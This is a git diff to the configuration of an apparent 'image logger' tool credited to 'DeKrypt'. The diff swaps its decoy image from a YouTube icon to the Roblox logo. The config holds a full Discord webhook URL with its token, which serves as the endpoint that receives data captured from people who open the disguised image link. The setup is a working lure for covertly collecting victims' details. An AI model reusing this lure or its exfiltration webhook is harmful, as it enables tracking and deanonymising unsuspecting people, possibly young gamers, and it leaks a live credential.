@@ -14,7 +14,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1444381628754563123/2ZzVsNqMiJ5KWWjmAgXjcAwTu_FL9Lm_FsvmWoEHzLD80JLtBpshpZJoJ0zSYDRzZ3Vu",
-    "image": "https://img.freepik.com/vecteurs-premium/icones-youtube-couleurs_1209566-1.jpg?semt=ais_hybrid&w=740&q=80", # You can also have a custom image by using a URL argument
+    "image": "https://upload.wikimedia.org/wikipedia/commons/7/7e/Roblox_Logo_2022.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
